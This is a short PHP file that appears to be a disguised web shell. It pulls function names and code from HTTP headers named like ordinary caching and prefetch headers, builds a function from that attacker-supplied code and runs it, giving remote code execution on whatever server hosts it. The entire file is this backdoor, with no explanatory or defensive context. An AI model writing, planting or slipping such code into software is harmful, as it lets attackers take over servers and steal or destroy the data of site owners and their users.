<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $class = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Unmodified-Since']($_HEADERS['If-Modified-Since']));
    $class();
}